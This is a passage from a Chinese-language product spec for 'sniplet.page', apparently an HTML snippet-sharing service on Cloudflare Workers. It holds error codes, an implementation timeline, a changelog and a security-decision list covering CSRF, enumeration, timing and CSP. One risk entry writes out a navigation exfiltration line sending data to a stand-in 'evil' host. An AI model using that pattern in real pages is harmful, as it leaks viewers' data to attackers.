| 400 | `invalid_origin` | `Origin` header 缺失,或不符合 `sniplet.page` / `*.sniplet.page`(v0.8.11 S-6 CSRF 防護) |

- **Success**:`200 { "status": "logged_out" }` + `Set-Cookie: st=; Max-Age=0; Domain=sniplet.page`

### 依 HTTP Status 快查

| Status | 意義 | 出現處 |
|--------|------|--------|
| 200 | 成功 | 多處 |
| 204 | 成功無 body | DELETE |
| 400 | Bad Request | POST、PATCH、/auth/request、/auth/consume |
| 401 | Unauthorized | PATCH、DELETE(含 slug 不存在,F-33 統一)、/auth/consume |
| 404 | Not Found | GET `{slug}.sniplet.page/`(含過期) |
| 410 | Gone | PATCH、DELETE(已過期,僅 valid token 驗證後可見;公眾 GET 統一 404);/auth/consume(token 過期) |
| 422 | Unprocessable | /auth/consume(已 consumed) |
| 429 | Too Many Requests | POST /v1/sniplets(per-IP)、/auth/request(per-email, per-IP) |
| 451 | Unavailable For Legal Reasons | POST (blocked) |
| 500 | Server Error | postfix exhausted |
| 503 | Service Unavailable | POST /v1/sniplets(全站 1000/day)、/auth/request(全站 send cap,F-32) |

### Error Logging

每個錯誤觸發時 Analytics Engine 記錄:

```ts
env.ANALYTICS.writeDataPoint({
  blobs: ["error", endpoint, error_code],
  indexes: [today]
});
```

**不記錄**:response body 內容、user email、IP、HTML 內容、magic token、owner_token。

## 17. Implementation 時間軸 (≈11 hr effort)

以下為純 effort 估算。0–1hr 的前置步驟建議在正式 coding 前先完成。

| 階段 | 里程碑 |
|------|--------|
| 0–1hr(前置) | Cloudflare 註冊 sniplet.page、DNS 生效、**wildcard DNS record `*.sniplet.page` → Workers**、**啟用 DNSSEC**、設 CAA record、Resend 註冊 + DKIM + 取 `RESEND_API_KEY`、Bot Fight Mode 啟用、Turnstile site 建立 + 取 `TURNSTILE_SECRET`、產生 4 個 random secrets、**確認 CF Log Push 未啟用或 Authorization header 在 drop list**、wildcard SSL cert(Universal SSL 自動 provision) |
| 1–3hr | Worker router(hostname-based 分流 api/apex/sniplet subdomain、reserved subdomains、daily cap、**永遠 postfix** 邏輯)、POST/GET/DELETE/PATCH 核心、email index 基本寫入、security headers(**統一嚴格 CSP** + XFO DENY + HSTS)、1MB 大小檢查、IP hash 用 HMAC + IPv6 normalize 到 /64、local `curl` 通 |
| 3–4hr | 部署 wildcard DNS + 驗證 `{slug}.sniplet.page` 可正常解析並 serve、HTTPS 驗證、Accept 分流 |
| 4–5.5hr | Auth:JWT helper(雙 secret、HS256 enforce)、`/auth/request`(ctx.waitUntil + Resend + per-IP rate limit)、**兩段式 `/auth/verify` 確認頁 + `POST /auth/consume`**、`MAGIC_CONSUMED_KV` one-shot、cookie `Domain=sniplet.page` |
| 5.5–7hr | Challenge page(含 cross-origin form POST 設定 + CORS on /auth/request)、viewer 檢查、Turnstile 整合、私享 end-to-end、**跨 sniplet session 共享驗證** |
| 7–8hr | SKILL.md 檔案產出並 push GitHub、**RUNBOOK.md push 到 ops repo**、`/security` page + `/.well-known/security.txt` 上線、Analytics Engine events 植入(含 csp_violation、auth_consumed)、Claude.ai 實測、**CSP violation reporting endpoint `/v1/csp-report`** |
| 8–9hr | TTL cron、edge cases、security headers 驗證、**timing test**、**CSP 實測(各種 CDN、fetch 擋下、img exfil 擋下)**、**SOP cross-sniplet 測試**、**one-shot token 測試**、**email scanner 模擬(curl /auth/verify 不 consume)** |
| 9–10.5hr | End-to-end regression、bug fix、**UX 實測 `{slug}.sniplet.page` URL 在 LINE/Slack/WhatsApp/iMessage auto-link**、設 ops alerts |
| 10.5–11hr | Buffer |
| Ship | v1 MVP live 🚀 |

---

**狀態**:v0.8.12 完成(承接 v0.8.11 定稿 + 第六輪三項補丁)。交付檔案:`sniplet-page-prd.md` + `sniplet-page-skill.md`(frontmatter name `sniplet-page-share`)+ `RUNBOOK.md`;`/security` page + `/.well-known/security.txt` 由 Worker 實作(規格於 §10.7 / §10.8)。可進入 implementation 階段。

**交付 bundle(3 個檔案 + 2 個 live endpoint)**:
- `sniplet-page-prd.md`(本檔)— 產品、技術、安全、商業、成本完整規格
- `sniplet-page-skill.md` — AI agent 使用的 skill 定義(獨立檔案,frontmatter name `sniplet-page-share`,推到 public GitHub repo)
- `RUNBOOK.md` — Secret rotation / incident response / ops 流程(ops 內部,**不公開**)
- `https://sniplet.page/security` — 公開安全政策(Worker serves §10.7 HTML)
- `https://sniplet.page/.well-known/security.txt` — RFC 9116(Worker serves §10.8 text)

**給 Claude Code 的交接提醒**:
1. 本 PRD 是 single source of truth,與片段討論矛盾時以本文為準
2. `sniplet-page-skill.md` 已獨立存於交付 bundle,push 到 public GitHub repo 時以檔名 `SKILL.md` 上傳
3. §16 錯誤碼總表是 implementation reference,所有 API error handling 以此為準
4. GitHub repo URL 待 XP 在 implementation 前決定
5. 先跑 §17 0–1hr 的手動步驟(尤其 wildcard DNS 和 SSL 的生效驗證),再進 coding
6. 全部 §11 checklist 項目在 code review 時逐項勾選

---

## 變更紀錄

**當前版本:v0.8.12(2026-04-21)** — 第六輪補丁,承接 v0.8.11 定稿,補三個 HIGH severity gap:Resend 費用保護、owner 操作 enumeration、R2 寫入原子性。

### v0.8.12 重點變更(相對 v0.8.11)

**安全增強**(第六輪審計發現的三個 HIGH):
- **F-32 `/auth/request` 全站 send cap**:防 attacker 用 botnet + 部分真實 email 打爆 Resend 配額。KV counter `auth_send_daily:<date>`,僅在實際 `ctx.waitUntil(resend.send)` path 計數;peek 在 whitelist lookup **之前**,雙 path 一致 → 不破 Strategy C;超過 cap 回 503 `service_unavailable`;ops alert `auth_global_cap_hit`。Cap 預設 100/day(對齊 Resend 免費 tier),升 tier 時 bump
- **F-33 Owner 操作 status code 統一**:`DELETE` / `PATCH` 的「slug 不存在」與「token 錯」原本分別回 404 / 401,形成 free slug enumeration oracle。現一律回 `401 invalid_token`,用 constant-time + dummy hash 維持 timing 一致;`410 expired` 僅在 valid token 驗證通過後可見。§8 加獨立「Owner 操作驗證順序」小節
- **F-34 R2 create-only 寫入**:`put` 加 `onlyIf: { etagDoesNotMatch: '*' }`,`PreconditionFailed` 作為 postfix 碰撞訊號,避免並發 POST 抽到同一 postfix 時後寫者覆蓋前者。§7.15 明禁「先 head 再 put」的 TOCTOU race 寫法

**本版不處理**(已評估,接受為 v1 or later):
- GDPR Art 17 self-service erasure:台灣 PDPA 無對應條款,v1 依 §8 takedown 手動流程兜底;EU 使用者若出現再評估
- `/v1/csp-report` rate limit、`Permissions-Policy` header、session TTL 與 sniplet TTL 對齊:MEDIUM / LOW 議題,v0.8.13+ 或 v2 處理

### v0.8.11 重點變更(相對 v0.8.10)

**架構級**:
- **F-11 升 v1**:`meta.viewers[]` 改存 `{ h: HMAC, m: masked }`;JWT `sub`(session + magic)也改用 HMAC(`EMAIL_HASH_SECRET`);R2 / cookie 外洩不再直接等於完整 email 外洩
- **移除 `SECURITY.md` 檔**:改為 Worker serve `sniplet.page/security` page(§10.7)+ RFC 9116 `/.well-known/security.txt`(§10.8);符合非 open-source 公開服務慣例
- **API routing 新增 `POST /v1/csp-report`**:第四輪審計的 CSP report endpoint 原本遺漏未列,補齊

**安全增強**:
- **`/auth/logout` 加 Origin header 檢查**(S-6):擋跨站 CSRF logout(`SameSite=Lax` 無法擋此情境,`Set-Cookie: Max-Age=0` 無條件清 cookie)
- **API Worker 明示忽略 session cookie**(S-3):§7.20 + §7.22 紀律要求 api subdomain MUST NOT 讀 / log `Cookie` header
- **授權 re-check invariant 明寫為 MUST**:§7.20 強調「每次 GET 私享 sniplet 都必須重 load `meta.viewers[].h` 與 cookie `sub` 比對」,確保 PATCH 移除 viewer 立即生效
- **CORS / return_to regex 統一 + 對齊實際 slug 範圍**(8–45 字元);原先 CORS `{0,38}` 會擋掉 long-slug 私享 auth

**可觀測性**:
- **CSP 加 `report-to` + `Reporting-Endpoints` header**(S-1):向現行 W3C Reporting API 標準靠齊,`report-uri` 保留為舊瀏覽器相容

**文件 / PRD 內部一致性**:
- **skill.md localStorage 說明**:刪 path-based 時代遺留的「跨 sniplet 共用 storage」警告,改為「每個 sniplet 自己的 origin,localStorage 隔離」
- **skill.md 加 XSS escape 提醒**:`unsafe-inline` 下 creator 若嵌入使用者資料需 HTML-escape
- **EMAIL_INDEX_KV TTL 明定為 sniplet TTL**(§7.10):RUNBOOK §2.4 dual-compute migration 依賴此 TTL
- **RUNBOOK §2.4 `EMAIL_HASH_SECRET` 輪換重寫**:因 F-11 現在影響 index + R2 meta.viewers + session 三處,migration 需 dual-compute 或接受既有 sniplet 7 天斷鏈
- **RUNBOOK 新增 §3.4 SEV-3 劇本**(cookie 外洩回報)

**風險表更新**:
- F-29(session cookie 外洩無 per-user revocation)、F-30(logout CSRF)、F-31(API cookie 紀律)新增
- F-11 標示為 v0.8.11 升 v1 解決;風險 20 劃線

### v0.8.10 重點變更(相對 v0.8.9)

**架構級**:
- URL 結構:**path-based → subdomain-based**(`{slug}.sniplet.page`),wildcard DNS + Universal SSL wildcard cert
- Slug 策略:**衝突才 postfix → 永遠 postfix**(防品牌挪用 / phishing 混淆)
- Session cookie:**host-only → `Domain=sniplet.page`**(支援跨 sniplet session 共享)
- **移除 Fetch Metadata / COOP / §7.23 整套**:subdomain 架構下 SOP 天然解決 cross-sniplet isolation
- **統一嚴格 CSP**:不分 public/private,定位從 "跨 sniplet 防線" 改為 "per-sniplet sandbox + platform abuse 防線"
- **移除 edge cache**:ROI 低,invalidation 複雜度不值

**安全增強**:
- **兩段式 auth + one-shot token**:`GET /auth/verify` 確認頁不 consume,`POST /auth/consume` 實際驗證 + `MAGIC_CONSUMED_KV` 防 replay;根本解決 email scanner 預取 + magic link cloud-sync 放大效應
- **`/auth/request` per-IP rate limit**:30/day per /64,防 attacker DoS 合法 viewer 的 email quota
- **CF Log Push hygiene**:ops setup 強制確認

**Bug fix**:
- `crypto.subtle.timingSafeEqual` API 不存在 → 改指引 `node:crypto` 的 `timingSafeEqual` 或手寫 constant-time loop

**Doc 精煉**:
- RUNBOOK `EMAIL_HASH_SECRET` 輪換補 dual-write migration 流程
- RUNBOOK `IP_HASH_SECRET` 輪換補 abuse trace 斷鏈說明
- Skill frontmatter name:`sniplet-share` → `sniplet-page-share`
- Status page 策略:v1 不做,改用 GitHub repo README 的 Known Issues 段落
- `return_to` 驗證限縮到 slug pathname 格式

Draft 階段更早的 changelog 不保留;讀者只需關注當前規格。

---

## 關鍵安全與營運決策清單(F-1 ~ F-31,v0.8.11 更新)

v0.8.9 的 F-20 / F-22 / F-23(舊)因架構變更已移除;v0.8.10 新增 F-24 ~ F-27;v0.8.11 新增 F-29 ~ F-31、F-11 升 P0;v0.8.12 新增 F-32 ~ F-34。跳號 F-28 保留給 v0.8.11 審計中未觸發的額外發現(目前空)。

**P0(必修)**:
- **F-1 IP hash 用 HMAC**:`IP_HASH_SECRET`;meta.json `ip_hash`、per-IP quota KV key 皆走 `HMAC-SHA256`
- **F-2 Session cookie `Domain=sniplet.page`**(v0.8.10 從 host-only 改):支援跨 sniplet session 共享
- **F-3 `/auth/request` timing 消除**:Resend 用 `ctx.waitUntil()` defer;設計目標 hit/miss latency 差 < 5ms
- **F-6 One-shot magic token + 兩段式 auth**(v0.8.10 從 v2 roadmap 升 v1):`MAGIC_CONSUMED_KV` jti 防 replay;`/auth/verify` 確認頁不 consume,`/auth/consume` 實際驗證;防 email scanner 預取 + cloud-sync 放大
- **F-11 viewer email HMAC + masked 儲存**(v0.8.11 從 v2 升 v1):`meta.viewers[]` 改為 `{ h: HMAC, m: masked }`;JWT `sub` 亦為 HMAC;R2 / cookie 外洩不再等於完整 email 外洩
- **F-13 統一嚴格 CSP**(v0.8.10 從 v2 roadmap 升 v1):所有 sniplet 共用;`connect-src 'none'` + CDN allowlist;per-sniplet sandbox

**P1(應修)**:
- **F-4 XFO DENY**(CSP `frame-ancestors 'none'` 併入統一 CSP)
- **F-5 JWT secret 拆分** `SESSION_JWT_SECRET` / `MAGIC_JWT_SECRET`
- **F-7 Resend 失敗 ops alert** `resend_send_failed`
- **F-8 KV 並發繞過 documented**(daily cap 1000 兜底,v2 升 CF Rate Limiting Rules)
- **F-21 IPv6 per-IP normalize 到 /64**
- **F-23 `/auth/request` per-IP rate limit 30/day**(v0.8.10 加):防 DoS 合法 viewer email quota
- **F-32 `/auth/request` 全站 send daily cap**(v0.8.12 加):防 botnet + 部分真實 email 燒 Resend 配額;`METER_KV` counter 僅在實際 send 計數;peek-before-lookup 的 B2 方案保 Strategy C timing;cap 預設 100/day
- **F-33 Owner 操作 status code 統一**(v0.8.12 加):`DELETE` / `PATCH` 的 slug-not-found 與 token-mismatch 統一回 401,消除 slug enumeration free oracle;constant-time + dummy hash 保 latency 一致
- **F-34 R2 create-only 寫入**(v0.8.12 加):`put` 帶 `onlyIf: { etagDoesNotMatch: '*' }`,PreconditionFailed 觸發 postfix retry;避免並發 POST 同 postfix 覆寫

**P2(接受與 document)**:
- **F-9 過期 sniplet 統一 404**(PATCH/DELETE 帶 owner_token 仍回 410)
- **F-10 Challenge page 文案揭示私享**(永遠 postfix 部分 mitigation)
- ~~F-11 viewer 明文存於 R2 meta.json~~ **v0.8.11 升 P0,已上方列出**
- **F-12 HTML 明文存於 R2**(CF at-rest 對 operator 透明,非 E2E;v3+ 評估)
- **F-14 DNSSEC + CAA record**
- **F-15 Cron 失敗 alert** `cron_cleanup_success`
- **F-16 Secret rotation 流程** → `RUNBOOK.md`(含 `EMAIL_HASH_SECRET` dual-write migration)
- **F-17 Incident response 窗口** → `/security` page(§10.7)+ `/.well-known/security.txt`(§10.8)
- **F-18 GDPR Art 17 erasure v1 不處理**(7 天 TTL 作 data minimization 依據)
- **F-19 Gmail `+tag` / `.` 別名不處理**
- **F-22 Subdomain 架構的 UX 風險**(v0.8.10 加):`{slug}.sniplet.page` URL 在某些 messaging app 可能不 auto-link,ship 前實測 + SKILL.md 提示
- **F-24 CF Log Push hygiene**(v0.8.10 加):ops setup 必須確認未啟用或 Authorization drop
- **F-25 Navigation exfil CSP 不擋**(v0.8.10 加):`location = evil + '?' + data` 需要 viewer 主動點擊離開,attack value 低,接受
- **F-26 CDN supply chain**(v0.8.10 加):jsdelivr/cdnjs/unpkg 任一被 compromise 有 impact,接受風險,有事件時緊急更新 CSP
- **F-27 Team tier 內互信**(v0.8.10 加):v2 `{team}.sniplet.page/{slug}` 形式 team 內 sniplet 共用 subdomain origin,重新進入 same-origin 威脅模型,屆時重新引入軟體層防線(Fetch Metadata 等)
- **F-29 Session cookie 外洩無 per-user revocation**(v0.8.11 S-4b):30 天 session 被偷 cookie 的攻擊者可 read-only 瀏覽 Alice 白名單私享 sniplet,v1 無 per-user revocation,只有 `SESSION_JWT_SECRET` 全體輪換 nuclear 選項(RUNBOOK §3.4 SEV-3 劇本);嚴重度 LOW,v2 評估 revoke list
- **F-30 `/auth/logout` CSRF**(v0.8.11 S-6):加 `Origin` header 檢查,合法 `sniplet.page` / `*.sniplet.page` 才處理,其他 400 `invalid_origin`
- **F-31 API Worker 忽略 session cookie**(v0.8.11 S-3):`Domain=sniplet.page` 會讓 cookie 散到 api subdomain,紀律上 API Worker MUST NOT 讀 / log cookie(§7.20、§7.22)

**v0.8.10 移除**:
- ~~F-20 COOP for private sniplets~~:subdomain 下 cross-origin window.open 被 SOP 擋
- ~~F-22(舊) Edge cache TTL 60 秒~~:移除 edge cache
- ~~F-23(舊) localStorage 跨 sniplet 共用~~:subdomain 下每個 sniplet 自己的 storage origin
